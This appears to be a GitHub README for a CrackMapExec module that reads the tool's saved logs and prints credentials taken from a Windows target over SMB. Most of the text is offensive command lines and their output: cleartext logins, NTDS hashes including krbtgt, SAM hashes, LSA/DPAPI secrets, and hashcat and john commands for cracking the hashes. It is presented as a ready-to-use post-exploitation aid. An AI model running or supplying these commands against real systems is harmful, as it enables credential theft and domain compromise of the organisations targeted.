# CME-Module-info
CrackMapExec module checks LOG files (in combination with IP & Hostname) when connected to the system and prints login information from logs.

    crackmapexec smb 10.10.10.10 -M info
        [+] (Pwnd3!): TEST-PC\administrator:password -id 12 (Prints pwnd accounts with credential ID to login faster)
    
    crackmapexec smb 10.10.10.10 -id 12
        [+] TEST-PC\administrator:password (Pwn3d!)


https://user-images.githubusercontent.com/49560894/176028088-213208f7-fe13-4f3e-9285-6a84b9abe9c7.mp4


    crackmapexec smb 10.10.10.10 -M info --ntds      (Prints Administrator and krbtgt hashes)
        [+] NTDS: location: /root/.cme/logs/TEST-PC_192.168.56.113_2022-05-31_081331.ntds
        [+] NTDS: Administrator:500:111f37ed915c5716aad3b435b51404ee:eb37f9cd74303274cb923442a7348ef4:::    
        [+] NTDS: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f031bf1f16bba6f9de84dffcc164e0f8::: 
        [+] NTDS: LM Crack: [hashcat -m 3000 -a 3 /location] or [john --format=lm /location] detected 18x (Prints when available)
        [+] NTDS: NT Crack: [hashcat -m 1000 -a 3 /location] or [john --format=nt /location]   
        
   ![image](https://user-images.githubusercontent.com/49560894/176029558-c06238a8-cc26-4607-a5b1-d53c57857b34.png)

   
    crackmapexec smb 10.10.10.10 -M info --sam       (Prints SAM file only local Administrator with valid password)
        [+] SAM: Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: 

![image](https://user-images.githubusercontent.com/49560894/176030994-6c60df1e-88fe-4c20-ac80-7791295bddf7.png)


    
    crackmapexec smb 10.10.10.10 -M info --lsa
        [+] LSA: dpapi_machinekey:0x4e467fabe4afb57..ce3730
        [+] LSA: dpapi_userkey:0x0797f33ba6c6043ff7..1558bc
        [+] LSA: NL$KM:c53c6dcd9cff1a4cf8355c4f3c40..32d1be
        
![image](https://user-images.githubusercontent.com/49560894/176030457-ffdf792e-0f70-494a-9ece-f9f8a6988a40.png)


    crackmapexec smb 10.10.10.10 -M info --only-file        (Prints all LOG files location)
        [+] LOG: location: /root/.cme/logs/TEST-PC_192.168.56.113_2022-05-31_081331.ntds
        [+] LOG: location: /root/.cme/logs/TEST-PC_192.168.56.113_2022-06-21_113422.sam
        [+] LOG: location: /root/.cme/logs/TEST-PC_192.168.56.113_2022-06-23_180720.secrets
        [+] LOG: location: ...snip.. 

    crackmapexec smb 10.10.10.10 -M info --only-file --sam
        [+] LOG: location: /root/.cme/logs/TEST-PC_192.168.56.113_2022-06-21_113422.sam
   
    crackmapexec smb 10.10.10.10 -M info --only-file --lsa
        [+] LOG: location: /root/.cme/logs/TEST-PC_192.168.56.113_2022-06-23_180720.secrets
   
    crackmapexec smb 10.10.10.10 -M info --only-file --ntds 
        [+] LOG: location: /root/.cme/logs/TEST-PC_192.168.56.113_2022-05-31_081331.ntds
